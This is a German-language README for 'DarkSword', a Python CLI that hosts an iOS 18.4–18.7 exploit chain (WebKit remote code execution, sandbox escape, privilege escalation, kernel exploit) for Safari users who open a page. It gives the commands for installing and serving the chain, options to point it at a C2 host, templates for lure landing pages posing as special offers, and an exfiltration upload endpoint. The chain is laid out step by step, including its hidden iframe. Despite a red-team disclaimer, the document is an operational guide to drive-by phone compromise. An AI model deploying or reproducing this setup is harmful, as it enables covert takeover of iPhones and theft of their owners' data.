# DarkSword Red Team Framework

Python-Framework mit CLI zur Bereitstellung der Exploit-Kette **DarkSword** bei Red-Team-Operationen. Basierend auf den Repositorys [DarkSword-RCE](https://github.com/htimesnine/DarkSword-RCE) und [darksword-kexploit](https://github.com/opa334/darksword-kexploit).

> **Hinweis**: Nur in autorisierten Umgebungen verwenden. Red-Team-Operationen bedürfen einer formellen Genehmigung.

## Referenzen

- [Google Threat Intelligence - DarkSword iOS Exploit Chain](https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain)
- Supported iOS 18.4 - 18.7 (WebKit RCE + privilege escalation)

## Installation

```bash
git clone https://github.com/bhideki/darksword.git
cd darksword
pip install -e .
```

## Schnellstart

```bash
darksword serve
```

Rufen Sie die Seite von einem iOS-Gerät (Safari) auf: `http://<IHRE_IP>:8080/`

Payloads und Kexploits sind bereits enthalten. Zum Aktualisieren: `darksword sync` und `darksword sync-kexploit`

## Kommandozeilenbefehle

| Befehl | Beschreibung |
|---------|-----------|
| `darksword serve`| Startet einen HTTP-Server zur Bereitstellung der Exploits |
| `darksword sync` | Lädt Payloads aus dem DarkSword-RCE-Repository herunter |
| `darksword list` | Listet lokal verfügbare Payloads auf |
| `darksword info` | Zeigt Informationen zur Kette und zu CVEs an |
| `darksword template generate` | Erstellt eine benutzerdefinierte Landingpage |
| `darksword template list` | Listet verfügbare Vorlagen auf |
| `darksword sync-kexploit` | Lädt einen Kernel-Exploit herunter (opa334, Objective-C) |

### Optionen von `serve`

```
darksword serve -H 0.0.0.0 -p 8080
darksword serve -p 8443 --c2-host https://seu-c2.com/payload
```

- `-H, --host`: Host (Standard: 0.0.0.0)
- `-p, --port`: Port (Standard: 8080)
- `--c2-host`: Benutzerdefinierter C2 (z. B.: `http://seu-ip:8080`) – überschreibt Host/Port in pe_main.js
- `--redirect`: Fallback-Weiterleitungs-URL

Ohne `--c2-host` werden Host und Port aus dem Host-Header übernommen (derselbe Server). Exfiltrierte Daten werden an `exfil/` gesendet und per POST an `/upload` übermittelt.

### Eine benutzerdefinierte Landingpage erstellen

```bash
darksword template generate --title „Sonderangebot“ --redirect https://site-legitimo.com
```

## Projektstruktur

```
DarkSword/
├── darksword/           # Python-Modul
│   ├── cli.py          # Haupt-CLI
│   ├── server.py       # HTTP-Server
│   ├── payloads.py     # Synchronisierung und Verwaltung von Payloads
│   └── config.py
├── payloads/            # Web-Payloads (nach „darksword sync“)
├── templates/           # Landing-Page-Vorlagen
├── kexploit/            # Kernel-Exploit in Objective-C (nach „darksword sync-kexploit“)
├── pyproject.toml
└── README.md
```

### Repo-Überprüfung

| Repo | Dateien |
|------|----------|
| **htimesnine/DarkSword-RCE** | index.html, frame.html, rce_loader.js, rce_module*.js, rce_worker*.js, sbx*.js, pe_main.js |
| **ghh-jb/DarkSword** | Identisch (Fallback) |
| **opa334/darksword-kexploit** | Makefile, src/main.m, entitlements.plist |
| **Nicht öffentlich** | rce_worker_18.7.js (iOS 18.7) |

## Ablauf der DarkSword-Kette

1. **index.html** → Die Landingpage lädt frame.html in einem versteckten Iframe
2. **frame.html** → Fügt rce_loader.js ein
3. **rce_loader.js** → Lädt RCE-Module entsprechend der iOS-Version
4. **rce_module.js / rce_module_18.6.js** → RCE-Module
5. **rce_worker_18.4.js / rce_worker_18.6.js** → Web Workers (JSC-Exploits)
6. **sbx0_main_18.4.js / sbx1_main.js** → Sandbox-Escape
7. **pe_main.js** → Privilegieneskalation

## Ethische Anforderungen

- **Genehmigung**: Verwenden Sie das Tool nur für Systeme, für deren Testen Sie die ausdrückliche Genehmigung haben
- **Umfang**: Halten Sie sich an die im Vertrag bzw. im Auftragsumfang festgelegten Grenzen
- **Dokumentation**: Protokollieren Sie alle Aktivitäten für die Berichte des Red Teams

## Lizenz

MIT – Nur für Bildungszwecke und autorisierte Sicherheitstests.
